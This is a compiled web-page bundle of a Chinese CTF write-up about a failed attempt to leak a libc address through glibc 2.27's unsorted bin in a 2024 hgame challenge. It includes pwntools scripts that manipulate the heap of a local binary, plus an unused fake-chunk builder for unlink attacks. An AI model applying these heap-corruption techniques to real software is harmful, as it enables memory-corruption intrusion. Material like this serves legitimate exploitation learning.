import{_ as n}from"./plugin-vue_export-helper-x3n3nnut.js";import{o as s,c as a,e as t}from"./app-KKfMbWiT.js";const p={},e=t(`<h1 id="记一次失败的unsoretedbin-泄露libc-2024hgameweek3-1" tabindex="-1"><a class="header-anchor" href="#记一次失败的unsoretedbin-泄露libc-2024hgameweek3-1" aria-hidden="true">#</a> 记一次失败的UnsoretedBin 泄露libc（2024hgameWeek3 [1]）</h1><ul><li>什么都pwn只会害了你</li></ul><blockquote><p>2024 hgame的week3的一道题 libc版本2.27 虽然这个思路失败了 但是觉得还是学了东西 就记录下来</p></blockquote><h2 id="题目" tabindex="-1"><a class="header-anchor" href="#题目" aria-hidden="true">#</a> 题目</h2><ul><li>main函数</li></ul><p>​ <img src="https://awaqwqa.github.io/img/hgame/week3/off_by_one/main.png" alt="main" loading="lazy"></p><ul><li><p>add函数</p><figure><img src="https://awaqwqa.github.io/img/hgame/week3/off_by_one/add.png" alt="add" tabindex="0" loading="lazy"><figcaption>add</figcaption></figure></li><li><p>delete函数</p><figure><img src="https://awaqwqa.github.io/img/hgame/week3/off_by_one/delete.png" alt="delete" tabindex="0" loading="lazy"><figcaption>delete</figcaption></figure></li><li><p>show函数</p><figure><img src="https://awaqwqa.github.io/img/hgame/week3/off_by_one/show.png" alt="show" tabindex="0" loading="lazy"><figcaption>show</figcaption></figure></li></ul><h2 id="原理" tabindex="-1"><a class="header-anchor" href="#原理" aria-hidden="true">#</a> 原理</h2><ul><li><p>首先libc版本为2.27 引入了<code>tcache</code>并且没有引入bk随机数安全检查机制</p></li><li><p><code>tcache bin</code>的范围为:<code>0x20-0x420</code></p></li><li><p><code>tcache bin</code>单个区间大小的链表长度最长为7个</p></li><li><p>然后根据add函数的逻辑 我们一次性只能new一个0xff大小的chunk 显然不足以超过<code>tcache bin</code>的大小 所以我们得先填充满tcache</p></li><li><p><code>unsorted bin</code>是一个双向链表</p><ul><li>unsorted bin中第一个chunk的bk和最后一个chunk的fd都指向main_arena+48（32位）或main_arena+88（64位）的位置</li><li>所以当unsortedbin只有一个chunk的时候那么fd和bk都指向了<code>main_arena+88</code>的位置</li><li>我们先把unsorted bin大小的chunk申请下来 然后再free 让fd和bk填充进去 然后malloc要回来</li></ul></li></ul><h2 id="实践" tabindex="-1"><a class="header-anchor" href="#实践" aria-hidden="true">#</a> 实践</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># r = process(&quot;./vuln&quot;)</span>
r <span class="token operator">=</span> gdb<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">&quot;./vuln&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;b *main+33&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">FakeChunk</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>prev_size <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>size <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>fd <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>bk <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>payload <span class="token operator">=</span> <span class="token string">b&quot;&quot;</span>
        self<span class="token punctuation">.</span>next_chunk_prev_size <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">get_chunk_str</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        chunk <span class="token operator">=</span> <span class="token string">b&quot;&quot;</span>
        chunk <span class="token operator">+=</span> self<span class="token punctuation">.</span>prev_size
        chunk <span class="token operator">+=</span> self<span class="token punctuation">.</span>size
        chunk <span class="token operator">+=</span> self<span class="token punctuation">.</span>fd
        chunk <span class="token operator">+=</span> self<span class="token punctuation">.</span>bk
        chunk <span class="token operator">+=</span> self<span class="token punctuation">.</span>payload
        <span class="token keyword">return</span> chunk
    <span class="token comment"># 构造fake chunk 只需要:fake chunk的size 以及指针原本的位置</span>
    <span class="token keyword">def</span> <span class="token function">set_chunk</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>size<span class="token punctuation">,</span>ptr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>prev_size <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>size <span class="token operator">=</span> p64<span class="token punctuation">(</span>size <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>fd <span class="token operator">=</span> p64<span class="token punctuation">(</span>ptr<span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>bk <span class="token operator">=</span> p64<span class="token punctuation">(</span>ptr<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>next_chunk_prev_size <span class="token operator">=</span> p64<span class="token punctuation">(</span>size<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>payload <span class="token operator">=</span> <span class="token punctuation">(</span>size <span class="token operator">-</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">b&quot;a&quot;</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>next_chunk_prev_size
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;构造的chunk:\\n\\tprev_size:0\\n\\tsize:</span><span class="token interpolation"><span class="token punctuation">{</span> size  <span class="token punctuation">}</span></span><span class="token string">\\n\\tfd:</span><span class="token interpolation"><span class="token punctuation">{</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>size <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">}</span></span><span class="token string">\\n\\tbk:</span><span class="token interpolation"><span class="token punctuation">{</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ptr<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token punctuation">}</span></span><span class="token string">\\n\\tpatload长度:</span><span class="token interpolation"><span class="token punctuation">{</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>payload<span class="token punctuation">)</span> <span class="token punctuation">}</span></span><span class="token string">\\n\\t总长度:</span><span class="token interpolation"><span class="token punctuation">{</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>get_chunk_str<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">waite_menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b&quot;Your choice:&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    waite_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b&quot;2&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b&quot;Index: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    waite_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b&quot;3&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b&quot;Index: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;------------------\\n删除index为</span><span class="token interpolation"><span class="token punctuation">{</span> index <span class="token punctuation">}</span></span><span class="token string">的chunk\\n------------------&quot;</span></span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>

    waite_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b&quot;1&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b&quot;Index: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b&quot;Size: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b&quot;Content: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;------------------\\n添加index为</span><span class="token interpolation"><span class="token punctuation">{</span> index <span class="token punctuation">}</span></span><span class="token string">的chunk\\n------------------&quot;</span></span><span class="token punctuation">)</span>

<span class="token comment"># fake_chunk = FakeChunk()</span>
<span class="token comment"># fake_chunk.set_chunk(size=0xa8,)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;i :&quot;</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;i :&quot;</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;i :&quot;</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0xa0</span><span class="token punctuation">,</span> <span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>先malloc 10个chunk(大于8个就行)</p><ul><li>因为如果unsorted bin的chunk和<code>top chunk</code>相邻会被直接合并 所以我们需要一个<code>alloced chunk</code>挡在<code>top chunk</code>前</li></ul></li><li><p>然后free 8个chunk 让<code>tcache bin</code>的位置填满 然后malloc 8个 让<code>tcache bin</code>先被消耗掉</p><ul><li>因为当<code>tcache chunk</code>有大小合适的 chunk的时候 优先取 <code>tcache chunk</code>然后再去寻找<code>unsorted bin</code></li></ul></li><li><p>然后我发现一个状况 就是新获得<code>unsroted bin</code>中的chunk fd和bk都被清空了</p><figure><img src="https://awaqwqa.github.io/img/hgame/week3/off_by_one/unsortedBin.png" alt="empty" tabindex="0" loading="lazy"><figcaption>empty</figcaption></figure></li><li><p>并且通过测试发现只要是刚好要malloc的chunk大小如何符合 这个<code>unsortedbin</code>的chunk的大小就会被清空</p></li><li><p>所以尝试其他思路</p></li></ul><h3 id="修改思路" tabindex="-1"><a class="header-anchor" href="#修改思路" aria-hidden="true">#</a> 修改思路</h3><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># r = process(&quot;./vuln&quot;)</span>
r <span class="token operator">=</span> gdb<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">&quot;./vuln&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;b *main+33&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">FakeChunk</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>prev_size <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>size <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>fd <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>bk <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>payload <span class="token operator">=</span> <span class="token string">b&quot;&quot;</span>
        self<span class="token punctuation">.</span>next_chunk_prev_size <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">get_chunk_str</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        chunk <span class="token operator">=</span> <span class="token string">b&quot;&quot;</span>
        chunk <span class="token operator">+=</span> self<span class="token punctuation">.</span>prev_size
        chunk <span class="token operator">+=</span> self<span class="token punctuation">.</span>size
        chunk <span class="token operator">+=</span> self<span class="token punctuation">.</span>fd
        chunk <span class="token operator">+=</span> self<span class="token punctuation">.</span>bk
        chunk <span class="token operator">+=</span> self<span class="token punctuation">.</span>payload
        <span class="token keyword">return</span> chunk
    <span class="token comment"># 构造fake chunk 只需要:fake chunk的size 以及指针原本的位置</span>
    <span class="token keyword">def</span> <span class="token function">set_chunk</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>size<span class="token punctuation">,</span>ptr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>prev_size <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>size <span class="token operator">=</span> p64<span class="token punctuation">(</span>size <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>fd <span class="token operator">=</span> p64<span class="token punctuation">(</span>ptr<span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>bk <span class="token operator">=</span> p64<span class="token punctuation">(</span>ptr<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>next_chunk_prev_size <span class="token operator">=</span> p64<span class="token punctuation">(</span>size<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>payload <span class="token operator">=</span> <span class="token punctuation">(</span>size <span class="token operator">-</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">b&quot;a&quot;</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>next_chunk_prev_size
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;构造的chunk:\\n\\tprev_size:0\\n\\tsize:</span><span class="token interpolation"><span class="token punctuation">{</span> size  <span class="token punctuation">}</span></span><span class="token string">\\n\\tfd:</span><span class="token interpolation"><span class="token punctuation">{</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>size <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">}</span></span><span class="token string">\\n\\tbk:</span><span class="token interpolation"><span class="token punctuation">{</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ptr<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token punctuation">}</span></span><span class="token string">\\n\\tpatload长度:</span><span class="token interpolation"><span class="token punctuation">{</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>payload<span class="token punctuation">)</span> <span class="token punctuation">}</span></span><span class="token string">\\n\\t总长度:</span><span class="token interpolation"><span class="token punctuation">{</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>get_chunk_str<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">waite_menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b&quot;Your choice:&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    waite_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b&quot;2&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b&quot;Index: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    waite_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b&quot;3&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b&quot;Index: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;------------------\\n删除index为</span><span class="token interpolation"><span class="token punctuation">{</span> index <span class="token punctuation">}</span></span><span class="token string">的chunk\\n------------------&quot;</span></span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>

    waite_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b&quot;1&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b&quot;Index: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b&quot;Size: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b&quot;Content: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;------------------\\n添加index为</span><span class="token interpolation"><span class="token punctuation">{</span> index <span class="token punctuation">}</span></span><span class="token string">的chunk\\n------------------&quot;</span></span><span class="token punctuation">)</span>

<span class="token comment"># fake_chunk = FakeChunk()</span>
<span class="token comment"># fake_chunk.set_chunk(size=0xa8,)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;i :&quot;</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;i :&quot;</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>然后修改思路 最后的malloc变为malloc一个更小的chunk 这样机制会优先去寻找<code>unsortedbin</code>来切割出一个更小的chunk</li></ul><h2 id="结果" tabindex="-1"><a class="header-anchor" href="#结果" aria-hidden="true">#</a> 结果</h2><blockquote><p>最终让fd和bk写上了main_arean+88的地址了 但是我忽略了 在写入内容的时候最后加了一个0导致我们没办法读出来 内容被阶段了 (悲)</p></blockquote>`,17),o=[e];function c(i,u){return s(),a("div",null,o)}const r=n(p,[["render",c],["__file","unsortedBinLeakLibc.html.vue"]]);export{r as default};
